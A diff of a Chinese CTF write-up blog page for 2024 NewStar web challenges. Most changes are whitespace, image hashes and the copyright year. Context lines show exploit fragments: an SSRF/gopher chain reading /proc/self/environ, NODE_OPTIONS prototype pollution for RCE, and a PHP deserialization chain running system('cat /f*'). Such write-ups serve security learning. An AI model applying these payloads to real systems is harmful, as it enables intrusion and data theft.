 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Request IP:&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">requestIP</span><span class="p">)</span><span class="w">
@@ -2750,9 +2750,9 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">http</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;[error]&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusInternalServerError</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w"> </span><span class="c1">// 渲染签名文件内容，如果SignaturePath被修改，可以读取任意文件</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">r</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mux</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">()</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">r</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">routeIndex</span><span class="p">)</span><span class="w">
@@ -2762,7 +2762,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Starting server on :8000&#34;</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">http</span><span class="p">.</span><span class="nf">ListenAndServe</span><span class="p">(</span><span class="s">&#34;:8000&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">r</span><span class="p">)</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="c1">// 启动Web服务器，监听8000端口，注册了三个主要路由和静态资源处理</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="c1">// 启动Web服务器，监听8000端口，注册了三个主要路由和静态资源处理</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>一个go语言，mian函数发现eye路由有模板注入，可以拿到密钥</p>
@@ -2789,7 +2789,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">那怎么拿</span><span class="n">flag</span><span class="err">？？？看</span><span class="n">Favorite路由</span><span class="err">，可以看到</span><span class="w"> </span><span class="o">`/</span><span class="n">favorite</span><span class="o">`</span><span class="w"> </span><span class="err">路由下，网页右下角的内容实际上是一个文件读的结果，</span><span class="o">**</span><span class="err">文件路径</span><span class="o">**</span><span class="err">默认为</span><span class="w"> </span><span class="o">`</span><span class="n">config</span><span class="p">.</span><span class="n">SignaturePath</span><span class="o">`</span><span class="w"> </span><span class="err">即</span><span class="w"> </span><span class="o">`</span><span class="p">.</span><span class="o">/</span><span class="n">sign</span><span class="p">.</span><span class="n">txt</span><span class="o">`</span><span class="w"> </span><span class="err">的内容。若使用</span><span class="w"> </span><span class="n">PUT</span><span class="w"> </span><span class="err">请求，则可以修改</span><span class="w"> </span><span class="o">`</span><span class="n">config</span><span class="p">.</span><span class="n">SignaturePath</span><span class="o">`</span><span class="w"> </span><span class="err">的值为</span><span class="o">`/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span><span class="o">`</span><span class="err">。</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">怎么打？看代码，利用</span><span class="n">curl打ssrf到这里并且修改token为</span><span class="o">`</span><span class="n">Papa</span><span class="o">`</span><span class="err">即可过两个</span><span class="n">return</span><span class="err">，然后把</span><span class="o">`</span><span class="n">body</span><span class="o">`</span><span class="err">改为</span><span class="o">`/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span><span class="o">`</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="err">怎么打？看代码，利用</span><span class="n">curl打ssrf到这里并且修改token为</span><span class="o">`</span><span class="n">Papa</span><span class="o">`</span><span class="err">即可过两个</span><span class="n">return</span><span class="err">，然后把</span><span class="o">`</span><span class="n">body</span><span class="o">`</span><span class="err">改为</span><span class="o">`/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span><span class="o">`</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后打put请求打gopher协议，代码如下</p>
@@ -3394,7 +3394,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250530110535818.png"
 	width="1798"
 	height="403"
-	srcset="/p/2024newstar-web/image-20250530110535818_hu_a26f3822b04f355c.png 480w, /p/2024newstar-web/image-20250530110535818_hu_19f59a5e4a01dba5.png 1024w"
+	srcset="/p/2024newstar-web/image-20250530110535818_hu_8fbb70479ead88c8.png 480w, /p/2024newstar-web/image-20250530110535818_hu_39242375a2feaa58.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250530110535818"
@@ -3408,7 +3408,7 @@
 <p><img src="/p/2024newstar-web/image-20250530110617177.png"
 	width="1730"
 	height="406"
-	srcset="/p/2024newstar-web/image-20250530110617177_hu_747272a67134900f.png 480w, /p/2024newstar-web/image-20250530110617177_hu_f6cb51c406a9a189.png 1024w"
+	srcset="/p/2024newstar-web/image-20250530110617177_hu_a51ae5e9887eb077.png 480w, /p/2024newstar-web/image-20250530110617177_hu_9a90b7f70833affb.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250530110617177"
@@ -3422,7 +3422,7 @@
 <p><img src="/p/2024newstar-web/image-20250530110711410.png"
 	width="1865"
 	height="292"
-	srcset="/p/2024newstar-web/image-20250530110711410_hu_9ac6d3161f837aea.png 480w, /p/2024newstar-web/image-20250530110711410_hu_b2dba5dcbfbaf1c5.png 1024w"
+	srcset="/p/2024newstar-web/image-20250530110711410_hu_bf37fa69c1c9f08e.png 480w, /p/2024newstar-web/image-20250530110711410_hu_8e38e5933ff52293.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250530110711410"
@@ -3507,55 +3507,55 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// 监听文件上传表单的提交事件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nx">event</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>  <span class="c1">// 阻止表单默认提交行为，防止页面刷新
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>  <span class="c1">// 创建FormData对象，用于收集表单数据
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="k">this</span><span class="p">);</span>  <span class="c1">// 创建FormData对象，用于收集表单数据
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="c1">// 发送POST请求到/upload接口
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>  <span class="c1">// 设置请求方法为POST
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">body</span><span class="o">:</span> <span class="nx">formData</span>   <span class="c1">// 将表单数据作为请求体发送
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">})</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="nx">formData</span>   <span class="c1">// 将表单数据作为请求体发送
+</span></span></span><span class="line"><span class="cl">  <span class="p">})</span>
 </span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>  <span class="c1">// 将响应转换为JSON格式
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// 将服务器返回的消息显示在uploadResult元素中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadResult&#39;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadResult&#39;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">      <span class="p">})</span>
 </span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// 如果发生错误，显示错误信息
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadResult&#39;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s1">&#39;Error: &#39;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;uploadResult&#39;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s1">&#39;Error: &#39;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">      <span class="p">});</span>
 </span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">// 监听命令执行表单的提交事件
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;commandForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;commandForm&#39;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nx">event</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>  <span class="c1">// 阻止表单默认提交行为
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// 获取表单数据并提取dir参数的值
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">const</span> <span class="nx">dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="k">this</span><span class="p">)).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">  <span class="c1">// 获取表单数据并提取dir参数的值
+</span></span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">dir</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="k">this</span><span class="p">)).</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">  <span class="c1">// 发送POST请求到/ls接口
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/ls&#39;</span><span class="p">,</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">  <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/ls&#39;</span><span class="p">,</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>  <span class="c1">// 设置请求方法为POST
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">      <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>  <span class="c1">// 设置请求头，指定内容类型
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">},</span>
+</span></span></span><span class="line"><span class="cl">    <span class="p">},</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span> <span class="s1">&#39;dir=&#39;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">dir</span><span class="p">)</span>  <span class="c1">// 将dir参数进行URL编码后作为请求体发送
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">})</span>
+</span></span></span><span class="line"><span class="cl">  <span class="p">})</span>
 </span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>  <span class="c1">// 将响应转换为JSON格式
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">output</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">// 如果响应中包含output字段
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="c1">// 将响应中的\n替换为实际的换行符
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="kr">const</span> <span class="nx">formattedOutput</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\\n/g</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">          <span class="c1">// 将响应中的\n替换为实际的换行符
+</span></span></span><span class="line"><span class="cl">          <span class="kr">const</span> <span class="nx">formattedOutput</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\\n/g</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">          <span class="c1">// 将格式化后的输出显示在output元素中
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">formattedOutput</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">formattedOutput</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">          <span class="c1">// 如果没有output字段，显示message字段的内容
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">      <span class="p">})</span>
 </span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// 如果发生错误，显示错误信息
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s1">&#39;Error: &#39;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">).</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s1">&#39;Error: &#39;</span> <span class="o">+</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">      <span class="p">});</span>
 </span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></td></tr></table>
@@ -3598,7 +3598,7 @@
 </div><p><img src="/p/2024newstar-web/image-20250601143009938.png"
 	width="1651"
 	height="375"
-	srcset="/p/2024newstar-web/image-20250601143009938_hu_a39034b14e021f21.png 480w, /p/2024newstar-web/image-20250601143009938_hu_d82d8b56edb5179d.png 1024w"
+	srcset="/p/2024newstar-web/image-20250601143009938_hu_a5898e5487b37549.png 480w, /p/2024newstar-web/image-20250601143009938_hu_796c2fd318b6dac5.png 1024w"
 	loading="lazy"
 	
 		alt="image-20250601143009938"
@@ -3696,7 +3696,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">	<span class="c1">#原因
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">fork</span> <span class="nx">创建子进程会尝试使用</span> <span class="nx">process</span><span class="o">.</span><span class="nx">execPath，也就是</span> <span class="nx">node</span> <span class="nx">本身。如果我们还可以控制</span> <span class="nx">options</span><span class="o">.</span><span class="nx">env，那就可以在</span> <span class="nx">fork</span> <span class="nx">执行之前先执行一段我们想要执行的代码。</span>
+</span></span></span><span class="line"><span class="cl">	<span class="nx">fork</span> <span class="nx">创建子进程会尝试使用</span> <span class="nx">process</span><span class="o">.</span><span class="nx">execPath，也就是</span> <span class="nx">node</span> <span class="nx">本身。如果我们还可以控制</span> <span class="nx">options</span><span class="o">.</span><span class="nx">env，那就可以在</span> <span class="nx">fork</span> <span class="nx">执行之前先执行一段我们想要执行的代码。</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">所以我们污染</span> <span class="nx">NODE_OPTIONS</span> <span class="nx">和</span> <span class="nx">env（ODE_OPTIONS</span> <span class="nx">会让</span> <span class="nx">Node</span><span class="o">.</span><span class="nx">js</span> <span class="nx">加载</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nx">self</span><span class="o">/</span><span class="nx">environ，然后环境变量中的恶意代码会被执行，即通过</span> <span class="nx">child_process</span><span class="o">.</span><span class="nx">execSync</span> <span class="nx">执行系统命令在</span> <span class="nx">env</span> <span class="nx">中写入恶意代码）</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">由于代码</span> <span class="nx">index</span><span class="o">.</span><span class="nx">js</span> <span class="nx">中的</span><span class="o">/</span><span class="nx">process路由使用了</span> <span class="nx">fork</span> <span class="nx">创建子进程</span><span class="p">,</span><span class="nx">子进程会继承父进程的环境变量</span><span class="p">,</span><span class="nx">污染后环境后，被污染的环境变量会被子进程继承，触发rce。</span>
 </span></span></code></pre></td></tr></table>
@@ -4655,12 +4655,12 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="k">new</span> <span class="nx">let_me</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">sign_in</span> <span class="o">=</span><span class="k">new</span> <span class="nx">ctf</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">sign_in</span><span class="o">-&gt;</span><span class="na">ctf</span> <span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="s2">&#34;get_flag&#34;</span><span class="p">);</span>	<span class="c1">#用数组的方法调用let_me类的get_flag，这里array($c,&#34;get_flag&#34;)相当于$c-&gt;get_flag(1)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">let_me</span> <span class="o">=</span><span class="s2">&#34;?&gt;&lt;?php system(&#39;cat /f*&#39;);&#34;</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">let_me</span> <span class="o">=</span><span class="s2">&#34;?&gt;&lt;?php system(&#39;cat /f*&#39;);&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#接下来触发ctf类中的die提前终止程序使 unlink无效
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">time</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctf</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">time</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctf</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">time</span><span class="o">-&gt;</span><span class="na">ctf</span> <span class="o">=</span> <span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span> <span class="c1">#这里=die也行
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
 </span></span></code></pre></td></tr></table>
@@ -4947,7 +4947,9 @@
     <section class="copyright">
         &copy; 
         
-        2025 luokaihong
+            2025 - 
+        
+        2026 luokaihong
     </section>
     
     <section class="powerby">
